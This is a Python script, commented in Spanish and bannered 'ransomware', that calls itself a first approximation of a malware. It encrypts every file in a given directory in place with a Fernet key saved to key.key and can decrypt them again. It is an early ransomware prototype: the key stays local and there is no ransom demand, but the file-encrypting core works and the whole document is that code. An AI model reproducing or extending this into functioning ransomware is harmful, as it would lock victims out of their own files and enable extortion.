"""
	Primera aproximacion de la solucion de un malware

	De momento encripta y desencripta un directorio pasado por argumento
	Introducir la opcion (-h) para mas ayuda
"""

import sys
import os
from cryptography.fernet import Fernet 

"""
	Funcion para mostrar el titulo con el nombre del programa
"""
def display_title():
	print('************************************************************************')
	print('____________    ____   __________   _______  _  _______ _______   ____  ')
	print('\_  __ \__  \  /    \ /  ___/  _ \ /     \ \/ \/ /\__  \\_  __ \_/ __ \ ')
	print(' |  | \// __ \|   |  \\___ (  <_> )  Y Y  \     /  / __ \|  | \/\  ___/ ')
	print(' |__|  (____  /___|  /____  >____/|__|_|  /\/\_/  (____  /__|    \___  >')
	print('            \/     \/     \/            \/             \/            \/ ')
	print('************************************************************************')

"""
	Funcion para mostrar el menu de ayuda
"""
def help():
	print('\t\t\t\tAYUDA')
	print('************************************************************************')
	print('(-p) Para introducir el path del directorio a encriptar o desencriptar.')
	print('(-a) Para decidir que accion realizar.')
	print('\t Introducir encrypt para encriptar.')
	print('\t Introducir decrypt para desencriptar.')
	print('************************************************************************')

"""
	Funcion para generar la clave simetrica y guardarla en un fichero llamado key.key
"""
def write_key():
	key = Fernet.generate_key()

	with open('key.key', 'wb') as key_file: 
		key_file.write(key)

"""
	Funcion para cargar la clave del fichero anteriormente guardado
"""
def load_key():
    return open("key.key", "rb").read()

"""
	Cargar datos de un fichero
"""
def load_data(filename):
	with open(filename, 'rb') as file:
		return file.read()

"""
	Salvar datos a un fichero
"""
def save_data(filename, data):
	 with open(filename, 'wb') as file:
			file.write(data)

"""
	Funcion para encriptar o desencriptar
"""
def encrypt_decrypt(filename, key, action):
	f = Fernet(key)

	data = load_data(filename)

	if action.lower() == 'encrypt':
		encrypted_data = f.encrypt(data)
		save_data(filename, encrypted_data)
		print('\t\t\tENCRYPTION SUCCESSFUL')
		print('************************************************************************')

	elif action.lower() == 'decrypt':
		decrypted_data = f.decrypt(data)
		save_data(filename, decrypted_data)
		print('\t\t\tDECRYPTION SUCCESSFUL')
		print('************************************************************************')

	else:
		raise Exception('Accion invalida') 

if __name__ == '__main__':
	display_title()
		
	try:
		# ayuda
		if (len(sys.argv) == 2) and (sys.argv[1] == '-h'):
			help()

		# encryption/decryption
		elif (len(sys.argv) == 5) and (sys.argv[1] == '-p') and (sys.argv[3] == '-a'):
			path = sys.argv[2]
			action = sys.argv[4]

			files = os.listdir(path=path)
			if action == 'encrypt': write_key()
			key = load_key()

			for f in files:
				full_path = path + os.sep + f
				encrypt_decrypt(full_path, key, action)

		else:
			raise Exception('Argumentos mal introducidos\n\t (-h) Para mostrar el menu de ayuda')

	except Exception as e:
		print(e)
